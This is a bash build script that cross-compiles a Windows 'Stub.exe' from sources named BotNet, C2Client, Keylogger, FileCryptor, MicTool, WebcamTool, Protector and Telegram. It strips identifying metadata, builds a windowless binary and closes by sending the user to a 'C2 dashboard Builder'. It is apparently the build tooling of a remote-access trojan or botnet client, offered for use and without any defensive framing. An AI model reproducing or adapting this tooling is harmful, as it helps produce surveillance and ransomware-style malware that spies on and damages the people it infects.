#!/bin/bash
# Cross-compile Stub.exe on Ubuntu using mingw-w64
# Prerequisites:
#   sudo apt install mingw-w64 mingw-w64-tools
#
# For CryptoPP (build once from source):
#   git clone https://github.com/weidai11/cryptopp
#   cd cryptopp
#   CXX=x86_64-w64-mingw32-g++ make -f GNUmakefile-cross
#   sudo cp libcryptopp.a /usr/local/lib/cryptopp-mingw/
#   sudo cp *.h /usr/local/include/cryptopp/
#
# Usage:
#   chmod +x build-linux.sh && ./build-linux.sh
#   ./build-linux.sh /path/to/cryptopp  # custom CryptoPP path

set -e

STUB_DIR="$(cd "$(dirname "$0")" && pwd)"
CROSS="x86_64-w64-mingw32"
GPP="${CROSS}-g++"
WINDRES="${CROSS}-windres"

# ── Find CryptoPP ────────────────────────────────────────────────────────────
CRYPTOPP="${1:-}"
if [ -z "$CRYPTOPP" ]; then
    for p in \
        /usr/local/lib/cryptopp-mingw \
        /opt/cryptopp-mingw \
        "$HOME/cryptopp" \
        "$STUB_DIR/../cryptopp"
    do
        if [ -f "$p/libcryptopp.a" ]; then CRYPTOPP="$p"; break; fi
    done
fi
if [ -z "$CRYPTOPP" ]; then
    echo "ERROR: CryptoPP not found."
    echo "Build it with:"
    echo "  git clone https://github.com/weidai11/cryptopp && cd cryptopp"
    echo "  CXX=x86_64-w64-mingw32-g++ make -f GNUmakefile-cross"
    echo "  sudo mkdir -p /usr/local/lib/cryptopp-mingw /usr/local/include/cryptopp"
    echo "  sudo cp libcryptopp.a /usr/local/lib/cryptopp-mingw/"
    echo "  sudo cp *.h /usr/local/include/cryptopp/"
    exit 1
fi
echo "[INFO] CryptoPP: $CRYPTOPP"

# ── Check tools ──────────────────────────────────────────────────────────────
for tool in "$GPP" "$WINDRES"; do
    command -v "$tool" >/dev/null 2>&1 || {
        echo "ERROR: $tool not found. Install with: sudo apt install mingw-w64"
        exit 1
    }
done

NLJSON="$STUB_DIR/../packages/nlohmann.json.3.9.1/build/native/include"
WINTHREAD=$(find /usr/lib/gcc -name "libwinpthread.a" 2>/dev/null | head -1)
if [ -z "$WINTHREAD" ]; then
    WINTHREAD=$(find /usr -name "libwinpthread.a" 2>/dev/null | grep -i "x86_64" | head -1)
fi

cd "$STUB_DIR"

SOURCES="BotNet.cpp C2Client.cpp FileCryptor.cpp FileManager.cpp
         Information.cpp Keylogger.cpp Manager.cpp MicTool.cpp
         PrntSc.cpp ProcessManager.cpp Protector.cpp Requests.cpp
         ScreenTool.cpp ServiceManager.cpp Telegram.cpp Telemetry.cpp
         WebcamTool.cpp WinMain.cpp"

echo "[1/3] Compiling resource file..."
$WINDRES Stub.rc -o Stub_res.o

echo "[2/3] Compiling and linking..."
LDFLAGS="-Wl,--gc-sections"
if [ -n "$WINTHREAD" ]; then
    LDFLAGS="$LDFLAGS -Wl,--whole-archive $WINTHREAD -Wl,--no-whole-archive"
fi

$GPP $SOURCES Stub_res.o \
    -std=c++17 -O2 -mwindows \
    -s -fno-ident -fno-threadsafe-statics \
    -ffunction-sections -fdata-sections \
    $LDFLAGS \
    -static-libgcc -static-libstdc++ \
    -I"$CRYPTOPP" -L"$CRYPTOPP" \
    -I"$NLJSON" \
    -lcryptopp -lwininet -lgdiplus -lurlmon \
    -lpsapi -lvfw32 -lwinmm -lws2_32 -lole32 \
    -lshlwapi -ladvapi32 -luser32 -lgdi32 -lshell32 \
    -liphlpapi \
    -o Stub.exe

rm -f Stub_res.o
SIZE=$(stat -c%s Stub.exe 2>/dev/null || wc -c < Stub.exe)
echo "[3/3] Done — Stub.exe ready. Size: $((SIZE/1024)) KB"
echo "Next: run the C2 dashboard Builder tab to configure and download the stub."
